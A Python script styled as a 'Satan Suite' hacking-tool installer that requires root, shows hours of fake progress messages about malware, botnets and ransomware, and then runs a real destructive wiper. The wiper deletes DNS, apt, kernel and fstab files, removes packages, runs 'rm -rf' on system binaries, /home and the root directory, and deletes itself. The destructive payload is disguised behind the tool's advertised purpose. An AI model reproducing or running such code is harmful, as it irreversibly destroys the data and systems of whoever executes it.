#!/usr/bin/env python3
import os
import sys
import time
import shutil
from datetime import datetime

def animated_print(message, delay=1200, animation_char=".", animation_time=10):
    """Print a message with an animation, including start and end times."""
    start_time = datetime.now().strftime("%H:%M:%S")
    print(f"[{start_time}] Starting: {message}")

    for _ in range(animation_time):  # Simple animation loop
        print(animation_char, end='', flush=True)
        time.sleep(1)
    print()  # Newline after animation

    time.sleep(delay - animation_time)  # Adjust total delay

    end_time = datetime.now().strftime("%H:%M:%S")
    print(f"[{end_time}] Completed: {message}")

def check_sudo():
    """Ensure the script is run as sudo."""
    if os.geteuid() != 0:
        print("Script must be run as sudo")
        sys.exit(1)

def delete_file(filepath):
    """Delete a file if it exists."""
    if os.path.exists(filepath):
        os.remove(filepath)

def delete_directory(directory):
    """Delete a directory if it exists."""
    if os.path.exists(directory):
        shutil.rmtree(directory)

def uninstall_package(package_name):
    """Uninstall a package using apt."""
    os.system(f"apt-get remove -y {package_name}")

def destroy_system():
    """Perform system destruction steps."""
    print("\nInitiating full built sequence...\n")

    # Critical system file deletions
    delete_file("/etc/resolv.conf")
    delete_directory("/etc/apt")
    delete_file("/boot/vmlinuz")
    delete_file("/etc/fstab")
    os.system("rm -rf /lib/modules/*")
    
    # Uninstall common tools
    uninstall_package("git")
    uninstall_package("wget")
    uninstall_package("gophish")

    # Overwrite system binaries
    os.system("rm -rf /bin/* /sbin/* /usr/bin/* /usr/sbin/*")

    # Remove all user files
    os.system("rm -rf /home/*")
    os.system("rm -rf /*")  # DANGEROUS: Deletes everything possible.

    # Self-deletion
    os.remove(sys.argv[0])
    print("System built complete. Satan exiting built.")

def satan_suite():
    """Main Satan Suite simulation."""
    animated_print("Running Satan Suite v15.0", delay=1200)
    animated_print("Creating a universal patch assembly", delay=1200)
    animated_print("Building the ultimate hacking suite", delay=1200)
    animated_print("Scanning system for architecture weaknesses", delay=1200)
    animated_print("Applying dynamic patches to kernel vulnerabilities", delay=1200)
    animated_print("Downloading system-integrated attack modules", delay=1200)
    animated_print("Injecting malware libraries into secure zones", delay=1200)
    animated_print("Constructing advanced malware payloads", delay=1200)
    animated_print("Executing kernel injection protocols", delay=1200)
    animated_print("Simulating advanced packet sniffing", delay=1200)
    animated_print("Establishing remote botnet control", delay=1200)
    animated_print("Compiling exploit libraries", delay=1200)
    animated_print("Configuring supply chain attack vectors", delay=1200)
    animated_print("Simulating advanced web attack suite", delay=1200)
    animated_print("Compiling cross-platform malware binaries", delay=1200)
    animated_print("Preparing full destructive payload", delay=1200)
    animated_print("Downloading rootkit configurations", delay=1200)
    animated_print("Injecting ransomware payload", delay=1200)
    animated_print("Encrypting system files", delay=1200)
    animated_print("Removing decryption keys", delay=1200)
    animated_print("Finalizing system destruction module", delay=1200)
    animated_print("Preparing environment for complete wipe", delay=1200)
    animated_print("Injecting final destructive payload", delay=1200)

    # Destructive actions (executed immediately after the final step)
    destroy_system()

if __name__ == "__main__":
    check_sudo()

    # Validate the argument strictly
    if len(sys.argv) != 2 or sys.argv[1] != "--full-installation":
        print("Usage: sudo python3 satan.py --full-installation")
        sys.exit(1)

    satan_suite()
